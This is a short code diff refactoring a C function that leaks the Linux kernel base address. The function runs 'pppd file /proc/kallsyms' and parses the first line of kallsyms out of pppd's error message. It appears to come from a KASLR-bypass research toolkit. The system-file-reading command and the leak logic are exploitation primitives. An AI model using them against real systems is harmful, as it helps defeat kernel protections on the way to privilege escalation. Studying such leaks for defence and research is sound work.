@@ -19,9 +19,12 @@
 
 unsigned long get_kernel_addr_pppd_kallsyms() {
   FILE *f;
+  char *addr_buf;
+  char *endptr;
+  char *substr;
   const char *cmd = "pppd file /proc/kallsyms 2>&1";
+  const char *needle = "unrecognized option";
   unsigned long addr = 0;
-  const int addr_len = sizeof(long*) * 2;
   char buf[1024];
 
   printf("[.] trying '%s' ...\n", cmd);
@@ -41,18 +44,15 @@ unsigned long get_kernel_addr_pppd_kallsyms() {
   pclose(f);
 
   /* pppd: In file /proc/kallsyms: unrecognized option 'c1000000' */
-  const char *needle = "unrecognized option";
-  char *substr = (char *)memmem(buf, sizeof(buf), needle, strlen(needle));
+  substr = (char *)memmem(buf, sizeof(buf), needle, strlen(needle));
   if (substr == NULL)
     return 0;
 
-  char *addr_buf;
   addr_buf = strstr(substr, "'");
   if (addr_buf == NULL)
     return 0;
 
-  char *endptr = &addr_buf[addr_len];
-  addr = strtoul(&addr_buf[1], &endptr, 16);
+  addr = strtoull(&addr_buf[1], &endptr, 16);
 
   if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
     return addr;
